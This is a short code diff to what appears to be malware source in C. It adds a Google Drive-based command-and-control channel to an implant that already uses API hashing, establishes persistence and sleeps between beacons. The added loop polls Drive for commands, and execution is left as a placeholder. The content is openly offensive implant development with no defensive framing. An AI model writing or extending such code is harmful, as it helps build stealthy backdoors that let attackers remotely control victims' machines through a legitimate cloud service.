@@ -13,6 +13,7 @@
 #include <stdlib.h>
 #include "crypto.h"
 #include "api_hashes.h"
+#include "gdrive_c2.h"
 
 // Struct for dynamic API table
 typedef struct _API_TABLE {
@@ -147,10 +148,17 @@ int main() {
     // 3. Persistent foothold
     EstablishPersistence();
 
-    // 4. Main loop with stealth sleep
+    // 4. Initialize C2
+    InitGDriveApi();
+
+    // 5. Main loop with stealth sleep
+    char cmdBuffer[1024];
     while (TRUE) {
-        // Placeholder for Stage 2 execution logic
-        // ... decrypt and execute ...
+        // Check for commands via Google Drive
+        if (GDrive_CheckForCommands(cmdBuffer, sizeof(cmdBuffer))) {
+            // Process commands (placeholder)
+            // ... decrypt and execute ...
+        }
 
         StealthSleep(60000); // Sleep for 1 minute between cycles
     }
